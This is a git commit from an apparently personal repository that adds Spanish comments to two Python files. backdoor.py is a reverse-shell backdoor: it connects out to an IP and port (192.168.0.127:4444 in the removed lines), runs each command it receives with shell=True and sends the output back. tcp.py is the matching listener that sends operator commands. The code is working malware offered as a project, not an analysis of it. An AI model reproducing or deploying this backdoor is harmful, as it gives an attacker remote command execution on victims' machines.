c8e92e425729940c160f74295ee9c03fbd08aa77
EssEnemiGz <essenemiggz@gmail.com>
2021-11-18 16:05:52 -0400

    Comentarios agregados y cambios mínimos

--- backdoor.py
+++ backdoor.py
@@ -2,19 +2,19 @@ import socket
 import subprocess
 
 class door:
-    def __init__(self,ip, puerto):
+    def __init__(self,ip, puerto): # Conectarse a la computadora
         self.access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
         self.access.connect( (ip, puerto) )
     
-    def command_func(self, command):
+    def command_func(self, command): # Hacer que los comandos funcionen
         return subprocess.check_output(command, shell=True)
         
-    def run_commands(self):
+    def run_commands(self): # Correr comandos y recibir datos
         while True:
             command = self.access.recv(1024).decode()
             command_result = self.command_func(command)
             self.access.send(command_result)
         access.close()
 
-door_real = door("192.168.0.127", 4444)
+door_real = door() # Colocar IP
 door_real.run_commands()
--- tcp.py
+++ tcp.py
@@ -1,25 +1,25 @@
 import socket 
 
 class TCP:
-    def __init__(self, ip, puerto):
+    def __init__(self, ip, puerto): # Conectar a la computadora
         connection1 = access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         connection1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        connection1.bind( (ip, puerto) )
+        connection1.bind( (ip, puerto) ) # Especifica por donde se hace la conección y cómo lo va a hacer
         connection1.listen(0)
         print('Connection...')
         self.connection, addr = connection1.accept()
         print('Connection... Enable to ' + str(addr))
     
-    def commands(self, command):
+    def commands(self, command): # Pasar comandos
         self.connection.send(command.encode())
         return self.connection.recv(1024).decode()
 
-    def start(self):
+    def start(self): # Input de comandos
         while True:
             command = input(">")
             result = self.commands(command)
             print(result)
 
-run = TCP("192.168.0.127", 4444)
+run = TCP() # Conección por IP y puerto
 run.start()
